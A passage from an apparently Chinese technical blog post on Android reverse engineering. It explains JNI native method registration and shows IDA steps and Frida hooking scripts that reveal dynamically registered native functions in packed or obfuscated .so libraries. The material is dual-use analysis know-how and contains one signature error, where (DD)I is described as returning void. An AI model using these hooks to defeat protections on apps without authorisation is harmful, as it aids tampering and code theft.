&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">char</span> *signature;</span><br><span class="line">    <span class="keyword">void</span> *fnPtr;</span><br><span class="line">&#125; JNINativeMethod;</span><br></pre></td></tr></table></figure></p><p>name是java中定义的native函数的名字，fnPtr是函数指针，也就是C＋＋中java native函数的实现。signature是java native函数的签名，可以认为是参数和返回值。比如(LMyJavaClass;)V，表示函数的参数是LMyJavaClass(Java类MyJavaClass)，返回值是void。对于基本类型，对应关系如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">字符     Java类型     C/C++类型</span><br><span class="line">V         void         void</span><br><span class="line">Z         jboolean     boolean</span><br><span class="line">I         jint         int</span><br><span class="line">J         jlong        long</span><br><span class="line">D         jdouble      double</span><br><span class="line">F         jfloat       float</span><br><span class="line">B         jbyte        byte</span><br><span class="line">C         jchar        char</span><br><span class="line">S         jshort       short</span><br></pre></td></tr></table></figure></p><ul><li>数组则以”[“开始，用两个字符表示，比如int数组表示为［I，以此类推。</li><li>如果参数是Java类，则以”L”开头，以”;”结尾，中间是用”/“隔开包及类名，例如Ljava/lang/String;，而其对应的C＋＋函数的参数为jobject，一个例外是String类，它对应C＋＋类型jstring。</li><li><em>(DD)I</em> 表示2个double的参数，返回值为void</li></ul><p>举几个例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">static JNINativeMethod gMethods[] = &#123;</span><br><span class="line">    &#123;&quot;processDirectory&quot;, &quot;(Ljava/lang/String;Ljava/lang/String;Landroid/media/MediaScannerClient;)V&quot;, (void *)android_media_MediaScanner_processDirectory&#125;,</span><br><span class="line">    &#123;&quot;processFile&quot;, &quot;(Ljava/lang/String;Ljava/lang/String;Landroid/media/MediaScannerClient;)V&quot;,    </span><br><span class="line">(void *)android_media_MediaScanner_processFile&#125;,</span><br><span class="line">    &#123;&quot;setLocale&quot;, &quot;(Ljava/lang/String;)V&quot;, (void *)android_media_MediaScanner_setLocale&#125;,</span><br><span class="line">    &#123;&quot;extractAlbumArt&quot;, &quot;(Ljava/io/FileDescriptor;)[B&quot;,     (void *)android_media_MediaScanner_extractAlbumArt&#125;,</span><br><span class="line">    &#123;&quot;native_init&quot;, &quot;()V&quot;, (void *)android_media_MediaScanner_native_init&#125;,</span><br><span class="line">    &#123;&quot;native_setup&quot;, &quot;(DD)V&quot;, (void *)android_media_MediaScanner_native_setup&#125;,</span><br><span class="line">    &#123;&quot;native_finalize&quot;, &quot;(BDI)V&quot;, (void *)android_media_MediaScanner_native_finalize&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>可见动态注册时，不仅仅会将C/C++函数与Java调用的函数名做映射，也会与具体的调用类class进行绑定。因此，调用第三方so文件时，<strong>Java中定义的类名和package名都要严格对应</strong>。</p><p>动态注册的好处是：</p><ol><li>C/C＋＋中函数命名自由，不必拘泥特定的命名方式； </li><li>效率高。传统方式下，Java类call本地函数时，通常是依靠VM去动态寻找.so中的本地函数(因此它们才需要特定规则的命名格式)，而使用RegisterNatives将本地函数向VM进行登记，可以让其更有效率的找到函数； </li><li>运行时动态调整本地函数与Java函数值之间的映射关系，只需要多次call RegisterNatives()方法，并传入不同的映射表参数即可。</li></ol><h2 id="0x03-搜查静态注册函数"><a href="#0x03-搜查静态注册函数" class="headerlink" title="0x03.  搜查静态注册函数"></a>0x03.  搜查静态注册函数</h2><p><em>现在要解决上一篇文章留下的问题：若如果so文件加壳或严重混淆了，仅仅知道Java VM调用的Native方法是getNativeValue，怎么在so文件中找到相应的函数呢？或有没有更方便的方法定位so库里的方法。</em></p><p>若调用第三方so时，调用者的package和class和so文件中不对应，就会报Runtime java.lang.UnsatisfiedLinkError错误。package或class名不正确时：<br><img src="http://148.70.228.11/upload/ceeaacbe77a4c313b0316ce4a7f6ce66.png" alt=""></p><p>所以要调用第三方so库时，只需要在APP中定义正确的package/class和调用正确的method名，JVM就能找到对应的Native方法。如果我们只拿到一个so库，或者APP加固了无法看到调用这so时的package和class名，有多种方法可以找到这个package/class。</p><p>若so库只用了静态注册，所有JNI方法都可以在.dynamic导出函数表里找到。在IDA反编译：<br><img src="http://148.70.228.11/upload/d63714246340be3474071f2369e96d49.png" alt=""><br>或者简单使用objdump:<br><img src="http://148.70.228.11/upload/819d70fa12ab9894cd474d25de57149a.png" alt=""><br>在方法名中就可以明显地看到package/class。</p><p>如果用frida，就是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import frida</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    print(message[&quot;payload&quot;])</span><br><span class="line"></span><br><span class="line">jscode = &apos;&apos;&apos;</span><br><span class="line">var moduleName = &quot;/data/app/com.application-1/lib/arm/libnative.so&quot;</span><br><span class="line">Module.load(moduleName)</span><br><span class="line">Module.enumerateExports(moduleName, &#123;</span><br><span class="line">        onMatch: function(exports)&#123;</span><br><span class="line">            send(exports.name);</span><br><span class="line">        &#125;,</span><br><span class="line">        onComplete: function()&#123;</span><br><span class="line">            send(&quot;Stop&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">device = frida.get_device_manager().enumerate_devices()[-1]</span><br><span class="line">pid = device.spawn([&quot;com.arbitary.application&quot;])    # 任意APP</span><br><span class="line">session = device.attach(pid)</span><br><span class="line">device.resume(pid)</span><br><span class="line">script = session.create_script(jscode)</span><br><span class="line">script.on(&apos;message&apos;, on_message)</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure></p><p>这里有个坑就是路径必须是/data/app/…/的so,不能是/data/data/package/../，也不能是/sdcard啥的。不过这里也只能导出静态注册的导出函数。</p><h2 id="0x04-IDA静态搜查so"><a href="#0x04-IDA静态搜查so" class="headerlink" title="0x04. IDA静态搜查so"></a>0x04. IDA静态搜查so</h2><p>对于动态注册的Native方法，可使用IDA来进行静态探索。动态注册函数一般都在JNI_Onload中进行，所以可以使用IDA搜查JNI_Onload函数。</p><p>打开了上篇文章中的so文件，点开JNI_Onload F5后，是这样的：<br><img src="http://148.70.228.11/upload/a1cce16f789d398f3fb86f5dcf3b29e1.png" alt=""><br>这里可看到参数为 <em>int a1</em> ,IDA未能识别到参数的类型。根据<a href="http://androidxref.com/5.1.1_r6/xref/art/runtime/jni_internal.cc#3320" target="_blank" rel="noopener">jni_internal</a> 中加载so时的源码，可见JNI_Onload的原型为typedef int (<em>JNI_OnLoadFn)(JavaVM</em>, void<em>)，参数为JavaVM\</em>。根据这个，在IDA中将Jni_Onload的参数修改类型，Ctrl+Y修改为JavaVM*。同时，看到汇编中通过v3+偏移量进行函数调用，猜测v3可能为JNIEnv*类型，所以同时将v3的类型Ctrl+Y改为JNIEnv<em>。这样能帮助识别到一些函数：<br><img src="http://148.70.228.11/upload/4e8335b6018a2c729f749db64fdf6b7b.png" alt=""><br>可见这里先使用了JNIEnv</em>-&gt;FindClass，再调用了JNIEnv*-&gt;RegisterNatives。registerNativeMethods的原型如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RegisterNatives(env, <span class="string">"com/testing/jni/HelloWorldJNI"</span>,gMethods, <span class="keyword">sizeof</span>(gMethods) / <span class="keyword">sizeof</span>(gMethods[<span class="number">0</span>]));</span><br></pre></td></tr></table></figure></p><p>那么说明一定能在Jni_Onload这个函数中，找到说明映射关系的gMethods数组。直接看Jni_Onload的汇编，在一处发现了package/class字符串：<br><img src="http://148.70.228.11/upload/34e5267b727b23862990178933a8d2bf.png" alt=""><br>com/../的package字符串在R1寄存器，为registerNativeMethods的第1个参数，那直接找R2，就能找到第2个参数gMethods。<br><img src="http://148.70.228.11/upload/1892e1a052884ab8ed3a7cf3ce6e0e00.png" alt=""><br>根据NativeMethods结构体：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*used in RegisterNatives to describe native method name, signature, and function pointer.*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">char</span> *signature;</span><br><span class="line">    <span class="keyword">void</span> *fnPtr;</span><br><span class="line">&#125; JNINativeMethod;</span><br></pre></td></tr></table></figure></p><p>可分析出IDA中数据区的数据就是我们要的gMethods数组。在off_D7004处右键unDefine,再右键Structure，IDA自动识别了类型，选择JNI就重组为更方便看的样子,可看到第一个结构即指向了我们之前要的getNativeValue函数。<br><img src="http://148.70.228.11/upload/94c8d562eedba61f2a67209c031d083b.png" alt=""></p><h2 id="0x05-Frida动态搜查so"><a href="#0x05-Frida动态搜查so" class="headerlink" title="0x05.  Frida动态搜查so"></a>0x05.  Frida动态搜查so</h2><p>除了静态的方法，也可以用Frida来找到所有的动态注册方法。Frida可以在Java层和Native层对调用函数进行插桩hook，那么就可以用Frida对registerNatives方法加钩，在系统调用registerNatives方法动态注册函数时，将参数输出。</p><p>在实现这个方法时，我先参考了<a href="https://stackoverflow.com/questions/51811348/find-manually-registered-obfuscated-native-function-address#answer-51972887" target="_blank" rel="noopener">Jim West</a> 的代码：<br><img src="http://148.70.228.11/upload/a6c06b704dc3e91fc0a628ea0c98a348.png" alt=""></p><p>这里hook了libart.so中的registerNatives函数，是非常可靠的思路。但是用这个代码调了一周多后，修改了正确的RegisterNative的函数名了，也未能成功地输出参数，onEnter事件根本没有触发。之后，参考了另一段代码：<a href="https://github.com/iddoeldor/frida-snippets#reveal-native-methods" target="_blank" rel="noopener">Reveal native methods</a>。在这段代码的基础上进行了修改，成功输出了我们想要的动态注册参数：<br><img src="http://148.70.228.11/upload/2ed9c203261798679856385f114322f3.png" alt=""></p><p>但这里有一个问题，由于ASLR，此处输出的Native函数地址是动态变化的，根据这个地址无法追溯到具体的函数。</p><p>所以需要再修改一下代码，以下代码在hook里registerNatives的函数后，会所属的module和address存起来，之后再使用Process.enumerateModules和module.enumerateExports来读取相关so库的输出表，找到相应地址的函数名。根据这个函数名，一定程度上可在IDA中判断出调用的Native方法：<br><img src="http://148.70.228.11/upload/fa02e4657ccc89796050f1280544230e.png" alt=""></p><p>Python代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">"type"</span>] == <span class="string">"send"</span>:</span><br><span class="line">        print(message[<span class="string">"payload"</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line">jscode = open(<span class="string">"script.js"</span>,<span class="string">"r"</span>).read()</span><br><span class="line">device = frida.get_device_manager().enumerate_devices()[<span class="number">-1</span>]</span><br><span class="line">pid = device.spawn([<span class="string">"com.testing.package"</span>])</span><br><span class="line">session = device.attach(pid)</span><br><span class="line">device.resume(pid)</span><br><span class="line">script = session.create_script(jscode)</span><br><span class="line">script.on(<span class="string">'message'</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure></p><p>Js代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ModuleScanning = <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">  Process.enumerateModules(&#123;</span><br><span class="line">    onMatch: <span class="function"><span class="keyword">function</span>(<span class="params">exp</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(exp.name <span class="keyword">in</span> args)&#123;</span><br><span class="line">        Module.enumerateExports(exp.name, &#123;</span><br><span class="line">          onMatch: <span class="function"><span class="keyword">function</span>(<span class="params">exports</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(args[exp.name].indexOf(<span class="built_in">String</span>(exports.address)) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">              args[exports.address] = exports.name;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          onComplete: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    onComplete: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125; </span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> RevealNativeMethods = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> pSize = Process.pointerSize;</span><br><span class="line">  <span class="keyword">var</span> env = Java.vm.getEnv();</span><br><span class="line">  <span class="keyword">var</span> RegisterNatives = <span class="number">215</span>, FindClassIndex = <span class="number">6</span>; <span class="comment">// search "215" @ https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html</span></span><br><span class="line">  <span class="keyword">var</span> jclassAddress2NameMap = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> JNIResult = [];</span><br><span class="line">  <span class="keyword">var</span> JNIAddress = &#123;&#125;;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getNativeAddress</span>(<span class="params">idx</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> env.handle.readPointer().add(idx * pSize).readPointer();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// intercepting FindClass to populate Map&lt;address, jclass&gt;</span></span><br><span class="line">  Interceptor.attach(getNativeAddress(FindClassIndex), &#123;</span><br><span class="line">    onEnter: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">      jclassAddress2NameMap[args[<span class="number">0</span>]] = args[<span class="number">1</span>].readCString();</span><br><span class="line">    &#125;,</span><br><span class="line">    onLeave: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>)</span>&#123;&#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// RegisterNative(jClass*, .., JNINativeMethod *methods[nMethods], uint nMethods) // https://android.googlesource.com/platform/libnativehelper/+/master/include_jni/jni.h#977</span></span><br><span class="line">  Interceptor.attach(getNativeAddress(RegisterNatives), &#123;</span><br><span class="line">    onEnter: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, nMethods = <span class="built_in">parseInt</span>(args[<span class="number">3</span>]); i &lt; nMethods; i++) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">          https://android.googlesource.com/platform/libnativehelper/+/master/include_jni/jni.h#129</span></span><br><span class="line"><span class="comment">          typedef struct &#123;</span></span><br><span class="line"><span class="comment">             const char* name;</span></span><br><span class="line"><span class="comment">             const char* signature;</span></span><br><span class="line"><span class="comment">             void* fnPtr;</span></span><br><span class="line"><span class="comment">          &#125; JNINativeMethod;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">var</span> structSize = pSize * <span class="number">3</span>; <span class="comment">// = sizeof(JNINativeMethod)</span></span><br><span class="line">        <span class="keyword">var</span> methodsPtr = ptr(args[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">var</span> methodName = methodsPtr.add(i * structSize).readPointer();</span><br><span class="line">        <span class="keyword">var</span> signature = methodsPtr.add(i * structSize + pSize).readPointer();</span><br><span class="line">        <span class="keyword">var</span> fnPtr = methodsPtr.add(i * structSize + (pSize * <span class="number">2</span>)).readPointer(); <span class="comment">// void* fnPtr</span></span><br><span class="line">        <span class="keyword">var</span> jClass = jclassAddress2NameMap[args[<span class="number">0</span>]].split(<span class="string">'/'</span>);  </span><br><span class="line">        <span class="keyword">var</span> moduleName = DebugSymbol.fromAddress(fnPtr)[<span class="string">'moduleName'</span>] <span class="comment">// https://www.frida.re/docs/javascript-api/#debugsymbol</span></span><br><span class="line">        JNIResult.push(<span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">          <span class="built_in">module</span>: moduleName,</span><br><span class="line">          package: jClass.slice(<span class="number">0</span>, <span class="number">-1</span>).join(<span class="string">'.'</span>),</span><br><span class="line">          class: jClass[jClass.length - 1],</span><br><span class="line">          method: methodName.readCString(), <span class="comment">// char* name</span></span><br><span class="line">          signature: signature.readCString(), <span class="comment">// char* signature TODO Java bytecode signature parser &#123; Z: 'boolean', B: 'byte', C: 'char', S: 'short', I: 'int', J: 'long', F: 'float', D: 'double', L: 'fully-qualified-class;', '[': 'array' &#125; https://github.com/skylot/jadx/blob/master/jadx-core/src/main/java/jadx/core/dex/nodes/parser/SignatureParser.java</span></span><br><span class="line">          address: <span class="built_in">String</span>(fnPtr),</span><br><span class="line">        &#125;));</span><br><span class="line">        <span class="keyword">if</span>(moduleName <span class="keyword">in</span> JNIAddress)&#123;</span><br><span class="line">          JNIAddress[moduleName].push(<span class="built_in">String</span>(fnPtr));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          JNIAddress[moduleName] = [];</span><br><span class="line">          JNIAddress[moduleName].push(<span class="built_in">String</span>(fnPtr));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    onLeave: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>)</span>&#123;</span><br><span class="line">      ModuleScanning(JNIAddress);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; JNIResult.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> message = JNIResult[i];</span><br><span class="line">        <span class="keyword">var</span> address = <span class="built_in">JSON</span>.parse(message)[<span class="string">'address'</span>];</span><br><span class="line">        <span class="keyword">var</span> length = message.length;</span><br><span class="line">        <span class="built_in">console</span>.log(message.slice(<span class="number">0</span>,length<span class="number">-1</span>)+<span class="string">", \"Native\":\""</span>+JNIAddress[address]+<span class="string">"&#125;\""</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">Java.perform(RevealNativeMethods);</span><br></pre></td></tr></table></figure></p><p>这里有个小细节需要注意，在分析动态加载的so库时，需要在程序已经完成System.loadLibrary时，frida才能找到这个module，因此不能在一开始就使用Process.enumerateModules和Module.enumerateExports。在这里，我在动态注册结束后，onLeave时再去找so库的输出函数表，此时so库一定已经加载好了。</p><hr><p>如果想更精确地进一步确认调用的Native函数，以便在IDA中迅速定位进行分析，也可以用另一种方法。在这段代码中，输出了registerNatives方法的参数，以及相关module的base address，以此可在IDA中进行定位调用的相关函数：<br><img src="http://148.70.228.11/upload/3134708822240a8672725576b05f7a3f.png" alt=""><br>以getNativeValue为例，函数地址0xde2b0b85，so文件基地址0xde27d000，得到偏移：</p><p><em>offset =0xde2b0b85 -  0xde27d000  = 0x00033B85</em></p><p>此时打开IDA静态so文件，因为IDA加载文件时，基址为0，因此直接跳转到偏移值0x00033B85，即可找到对应的函数：<br><img src="http://148.70.228.11/upload/9cf9492117a4d543262f2f0b73095da9.png" alt=""></p><p>python代码和上面一样。JS代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ModuleScanning = <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">  Process.enumerateModules(&#123;</span><br><span class="line">    onMatch: <span class="function"><span class="keyword">function</span>(<span class="params">exp</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(exp.name <span class="keyword">in</span> args)&#123;</span><br><span class="line">        send(<span class="string">"[*] Module:"</span>+exp.name+<span class="string">",Address:"</span>+exp.base);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    onComplete: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125; </span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> RevealNativeMethods = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> pSize = Process.pointerSize;</span><br><span class="line">  <span class="keyword">var</span> env = Java.vm.getEnv();</span><br><span class="line">  <span class="keyword">var</span> RegisterNatives = <span class="number">215</span>, FindClassIndex = <span class="number">6</span>; <span class="comment">// search "215" @ https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html</span></span><br><span class="line">  <span class="keyword">var</span> jclassAddress2NameMap = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> moduleDict = &#123;&#125;;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getNativeAddress</span>(<span class="params">idx</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> env.handle.readPointer().add(idx * pSize).readPointer();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// intercepting FindClass to populate Map&lt;address, jclass&gt;</span></span><br><span class="line">  Interceptor.attach(getNativeAddress(FindClassIndex), &#123;</span><br><span class="line">    onEnter: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">      jclassAddress2NameMap[args[<span class="number">0</span>]] = args[<span class="number">1</span>].readCString();</span><br><span class="line">    &#125;,</span><br><span class="line">    onLeave: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// RegisterNative(jClass*, .., JNINativeMethod *methods[nMethods], uint nMethods) // https://android.googlesource.com/platform/libnativehelper/+/master/include_jni/jni.h#977</span></span><br><span class="line">  Interceptor.attach(getNativeAddress(RegisterNatives), &#123;</span><br><span class="line">    onEnter: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, nMethods = <span class="built_in">parseInt</span>(args[<span class="number">3</span>]); i &lt; nMethods; i++) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">          https://android.googlesource.com/platform/libnativehelper/+/master/include_jni/jni.h#129</span></span><br><span class="line"><span class="comment">          typedef struct &#123;</span></span><br><span class="line"><span class="comment">             const char* name;</span></span><br><span class="line"><span class="comment">             const char* signature;</span></span><br><span class="line"><span class="comment">             void* fnPtr;</span></span><br><span class="line"><span class="comment">          &#125; JNINativeMethod;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">var</span> structSize = pSize * <span class="number">3</span>; <span class="comment">// = sizeof(JNINativeMethod)</span></span><br><span class="line">        <span class="keyword">var</span> methodsPtr = ptr(args[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">var</span> methodName = methodsPtr.add(i * structSize).readPointer();</span><br><span class="line">        <span class="keyword">var</span> signature = methodsPtr.add(i * structSize + pSize).readPointer();</span><br><span class="line">        <span class="keyword">var</span> fnPtr = methodsPtr.add(i * structSize + (pSize * <span class="number">2</span>)).readPointer(); <span class="comment">// void* fnPtr</span></span><br><span class="line">        <span class="keyword">var</span> jClass = jclassAddress2NameMap[args[<span class="number">0</span>]].split(<span class="string">'/'</span>);</span><br><span class="line">        <span class="keyword">var</span> moduleName = DebugSymbol.fromAddress(fnPtr)[<span class="string">'moduleName'</span>];</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">          <span class="built_in">module</span>: moduleName, <span class="comment">// https://www.frida.re/docs/javascript-api/#debugsymbol</span></span><br><span class="line">          package: jClass.slice(<span class="number">0</span>, <span class="number">-1</span>).join(<span class="string">'.'</span>),</span><br><span class="line">          class: jClass[jClass.length - 1],</span><br><span class="line">          method: methodName.readCString(), <span class="comment">// char* name</span></span><br><span class="line">          signature: signature.readCString(), <span class="comment">// char* signature TODO Java bytecode signature parser &#123; Z: 'boolean', B: 'byte', C: 'char', S: 'short', I: 'int', J: 'long', F: 'float', D: 'double', L: 'fully-qualified-class;', '[': 'array' &#125; https://github.com/skylot/jadx/blob/master/jadx-core/src/main/java/jadx/core/dex/nodes/parser/SignatureParser.java</span></span><br><span class="line">          address: fnPtr</span><br><span class="line">        &#125;));</span><br><span class="line">        moduleDict[moduleName] = <span class="string">"1"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    onLeave: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>)</span>&#123;</span><br><span class="line">      ModuleScanning(moduleDict);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span 